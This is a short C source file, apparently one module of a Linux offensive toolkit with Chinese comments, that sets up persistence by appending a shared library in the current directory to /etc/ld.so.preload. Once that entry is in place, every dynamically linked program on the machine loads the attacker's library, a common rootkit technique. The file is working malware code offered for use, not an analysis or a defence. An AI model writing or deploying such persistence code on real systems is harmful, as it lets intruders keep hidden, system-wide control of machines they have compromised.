#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "info.h"
#include "linux_persistence_ldpreload.h"

#ifdef LD_PRELOAD_MOD
void setup_ld_preload_persistence() {
    printf("设置LD_PRELOAD持久化...\n");
    const char* ld_preload_path = "/etc/ld.so.preload";
    
    FILE *ld_preload_file = fopen(ld_preload_path, "a");
    if (ld_preload_file) {
        fprintf(ld_preload_file, "%s/libpreload.so\n", getcwd(NULL, 0)); // 添加当前目录下的 libpreload.so 共享库路径
        fclose(ld_preload_file);
        printf("持久化命令已添加到LD_PRELOAD。\n");
    } else {
        perror("无法打开 ld.so.preload 文件");
    }
}
#endif